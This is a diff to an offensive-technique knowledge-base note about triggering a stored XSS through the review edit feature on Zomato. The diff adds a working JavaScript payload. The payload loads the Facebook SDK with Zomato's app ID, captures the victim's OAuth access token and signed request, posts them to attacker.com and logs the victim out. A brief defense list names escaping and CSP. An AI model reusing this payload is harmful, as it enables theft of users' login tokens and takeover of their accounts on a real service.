@@ -1,13 +1,15 @@
 ---
+id: proc-632017-02
 tags:
   - xss
-  - trigger
-  - web
+  - execution
 type: procedure
-tools: []
+tools:
+  - '[[tools/Facebook-JavaScript-SDK]]'
 tactics:
   - '[[Execution]]'
-commands: []
+commands:
+  - '[[commands/xss-payload-fb-token-steal]]'
 verified: false
 platforms:
   - Web
@@ -15,12 +17,11 @@ submitted: true
 created_at: '2023-10-01T00:00:00Z'
 techniques:
   - '[[JavaScript]]'
-updated_at: '2025-12-14T03:16:37.416Z'
+updated_at: '2025-12-14T17:27:49.968Z'
 skill_level: intermediate
 impact_level: high
-detection_risk: low
+detection_risk: medium
 sub_techniques: []
-id: 82b2248c-51fc-4309-acc9-311940461121
 validated: true
 mitre_tactics:
   - '[[Execution]]'
@@ -31,49 +32,54 @@ mitre_techniques:
 
 ## Summary
 
-This procedure triggers the stored XSS payload by accessing the edit functionality of the injected review, exploiting poor output encoding during content rendering.
+This procedure triggers the stored XSS payload by editing the submitted review, executing JavaScript in the victim's browser to steal OAuth tokens.
 
 ## Description
 
-Once the payload is stored, Zomato's edit feature reloads the review content without proper escaping, allowing the JavaScript to parse and execute in the browser. This step demonstrates how standard user actions can activate the vulnerability, affecting the attacker's or victim's session. It requires the review to be visible and editable on the restaurant page.
+After submission, navigating to the review and clicking 'Edit' renders the 'with_tags_data' content unsafely, executing the stored script. For token theft, the payload loads the Facebook SDK and uses FB.login to capture authResponse. Prerequisites: Submitted review with payload; victim's browser session. Outcome: Arbitrary JS runs, tokens exfiltrated.
 
 ## Requirements
 
-1. Submitted review with payload from prior step
-2. Access to the restaurant page where review is listed
-3. Browser session with edit permissions
+1. Access to the review page (e.g., via link)
+2. Victim's browser with Facebook/Google login
+3. Attacker server to receive stolen data
+4. Review ID from submission
 
 ## Defense
 
 Defensive measures and detection strategies:
 
-- Encode output in edit forms using HTML entity encoding
-- Implement client-side validation to flag suspicious content
-- Log edit attempts and scan for script patterns
+- Escape user input in edit views (e.g., via DOMPurify)
+- Content Security Policy (CSP) blocking inline scripts
+- Rate limiting on review edits
+- JS error logging for anomalous prompts/requests
 
 ## Objectives
 
-1. Load unsanitized review content into edit interface
-2. Initiate payload evaluation during rendering
-3. Confirm trigger without additional injection
+1. Execute stored JavaScript
+2. Steal authentication tokens
+3. Exfiltrate data to attacker
 
 ## Instructions
 
-### Step 1: Locate Submitted Review
+### Step 1: Navigate to Review and Edit
 
-**Context**: Find the injected review on the restaurant page to access its edit option.
+**Context**: Load the review page and initiate edit to trigger rendering of 'with_tags_data'.
 
-Refresh the restaurant page (e.g., https://www.zomato.com/beirut/garcias-dbayeh-metn) and scroll to your review in the list.
+**Command** (No CLI; browser action):
 
-### Step 2: Initiate Edit Action
+> Click 'Edit' button; payload executes immediately.
 
-**Context**: Click edit to render the stored payload, triggering execution if vulnerable.
+### Step 2: Execute Advanced Token-Stealing Payload
 
-Click the 'Edit' button next to the review.
+**Context**: If using FB token steal, ensure SDK loads and posts data.
 
-> The edit form populates with the raw review text, parsing the img tag and attaching the onmouseover event.
+**Command** ([[commands/xss-payload-fb-token-steal]]):
+```html
+<script>// load fb js-sdk (function(d, s, id){ var js, fjs = d.getElementsByTagName(s)[0]; if(d.getElementById(id)){return;}  js = d.createElement(s); js.id = id;  js.src ="//connect.facebook.net/en_US/sdk.js";  fjs.parentNode.insertBefore(js, fjs); }(document,'script','facebook-jssdk')); window.fbAsyncInit=function(){ FB.init({ appId:'288523881080',// zomato fb app id xfbml:true, version:'v3.1' });  //get auth response ( accessToken and signedRequest ) FB.login(function(){  $.post('https://attacker.com/tokens.php',FB.getAuthResponse())});// send token and signed_request to attacker document.location.href ='https://www.zomato.com/logout';// logout from victims's account });  }</script>
+```
 
-**Expected Output**: Edit modal opens; hover over the injected img (if rendered) to see prompt.
+> Expected: FB SDK loads, login prompts if needed, tokens POST to attacker.com; session logs out.
 
 ## MITRE ATT&CK Mapping
 
@@ -90,11 +96,13 @@ Click the 'Edit' button next to the review.
 
 ## Commands Used
 
+- [[commands/xss-payload-fb-token-steal]]
 
 ## Tools Used
 
+- [[tools/Facebook-JavaScript-SDK]]
 
 ## Tags
 
 - [[xss]]
-- [[edit-trigger]]
+- [[Execution]]
